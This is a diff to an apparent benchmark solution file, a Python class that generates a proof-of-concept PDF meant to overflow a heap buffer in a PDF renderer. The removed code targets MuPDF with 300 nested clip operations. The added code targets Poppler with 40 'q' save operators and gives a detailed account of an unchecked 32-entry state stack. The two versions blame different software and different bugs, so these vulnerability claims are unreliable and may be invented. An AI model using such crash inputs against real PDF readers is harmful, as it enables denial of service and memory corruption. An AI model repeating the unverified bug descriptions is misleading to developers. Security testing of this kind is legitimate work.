@@ -1,77 +1,72 @@
-import io
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
 
-        Args:
-            src_path: Path to the vulnerable source code tarball
+        The vulnerability is a heap buffer overflow in Poppler's GfxState handling.
+        The `GfxState` object maintains a stack of previous states to handle nested
+        graphics state transformations, such as those initiated by the PDF `q` (save)
+        and `Q` (restore) operators.
 
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
+        This stack (`stateStack`) has a fixed size of 32 (`gfxStateStackSize`).
+        The `GfxState::save()` method, called when a `q` operator is processed,
+        pushes the current state pointer onto this stack without checking if the
+        stack is full.
+
+        By creating a PDF with a content stream containing more than 32 `q` operators
+        in a row, we can cause `GfxState::save()` to be called repeatedly. This leads
+        to an out-of-bounds write on the heap-allocated `GfxState` object, overflowing
+        the `stateStack` array.
+
+        This PoC constructs a minimal valid PDF with a content stream containing
+        40 `q` operators, which is sufficient to trigger the overflow.
         """
-        # The vulnerability is a heap buffer overflow in MuPDF due to an unchecked
-        # nesting depth for clipping paths. The function `pdf_push_clip`, called
-        # by the 'W' operator in a PDF content stream, increments a clip depth
-        # counter and writes to a graphics state array without verifying if it's
-        # within bounds. The default limit for this array is 256. To trigger the
-        # overflow, we repeat the 'W' operation more than 256 times.
-        num_repetitions = 300
         
-        # This block of PDF stream commands defines a 1x1 rectangle path ('re'),
-        # sets it as a clip path ('W'), which triggers the bug, and then starts
-        # a new path ('n') for the next iteration.
-        repeating_block = b'0 0 1 1 re W n '
+        # Using 40 'q' operators, which is greater than the stack size of 32.
+        payload = b"q " * 40
+
+        # Construct a minimal PDF structure
+        obj1_catalog = b"<< /Type /Catalog /Pages 2 0 R >>"
+        obj2_pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
+        obj3_page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>"
+        obj4_stream = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(payload), payload)
+
+        objects = [
+            obj1_catalog,
+            obj2_pages,
+            obj3_page,
+            obj4_stream
+        ]
+
+        pdf_body_parts = [b"%PDF-1.7\n"]
+        offsets = []
         
-        content_stream = repeating_block * num_repetitions
+        current_offset = len(pdf_body_parts[0])
+        for i, obj_content in enumerate(objects):
+            offsets.append(current_offset)
+            obj_str = b"%d 0 obj\n%s\nendobj\n" % (i + 1, obj_content)
+            pdf_body_parts.append(obj_str)
+            current_offset += len(obj_str)
         
-        poc_pdf = self._build_pdf(content_stream)
+        body = b"".join(pdf_body_parts)
+
+        xref_offset = len(body)
+        num_objects = len(objects) + 1
         
-        return poc_pdf
-
-    def _build_pdf(self, content_stream: bytes) -> bytes:
-        out = io.BytesIO()
-        offsets = {}
-
-        # PDF Header
-        out.write(b"%PDF-1.7\n")
-        out.write(b"%\xE2\xE3\xCF\xD3\n")
-
-        # Object 1: Catalog
-        offsets[1] = out.tell()
-        out.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
-
-        # Object 2: Pages Collection
-        offsets[2] = out.tell()
-        out.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
-
-        # Object 3: Page Object
-        offsets[3] = out.tell()
-        out.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Contents 4 0 R >>\nendobj\n")
-
-        # Object 4: Content Stream
-        offsets[4] = out.tell()
-        out.write(f"<< /Length {len(content_stream)} >>\n".encode('latin-1'))
-        out.write(b"stream\n")
-        out.write(content_stream)
-        out.write(b"\nendstream\nendobj\n")
+        xref_parts = [f"xref\n0 {num_objects}\n".encode('ascii')]
+        xref_parts.append(b"0000000000 65535 f \n")
+        for offset in offsets:
+            xref_parts.append(f"{offset:010d} 00000 n \n".encode('ascii'))
         
-        obj_count = 4
+        xref_table = b"".join(xref_parts)
 
-        # Cross-reference Table (xref)
-        xref_pos = out.tell()
-        out.write(b"xref\n")
-        out.write(f"0 {obj_count + 1}\n".encode('latin-1'))
-        out.write(b"0000000000 65535 f \n")
-        for i in range(1, obj_count + 1):
-            out.write(f"{offsets[i]:010d} 00000 n \n".encode('latin-1'))
+        trailer = f"trailer\n<< /Size {num_objects} /Root 1 0 R >>\n".encode('ascii')
+        
+        startxref = f"startxref\n{xref_offset}\n".encode('ascii')
+        eof = b"%%EOF"
 
-        # PDF Trailer
-        out.write(b"trailer\n")
-        out.write(f"<< /Size {obj_count + 1} /Root 1 0 R >>\n".encode('latin-1'))
-        out.write(b"startxref\n")
-        out.write(f"{xref_pos}\n".encode('latin-1'))
-        out.write(b"%%EOF\n")
-
-        return out.getvalue()
+        poc = body + xref_table + trailer + startxref + eof
+        
+        return poc
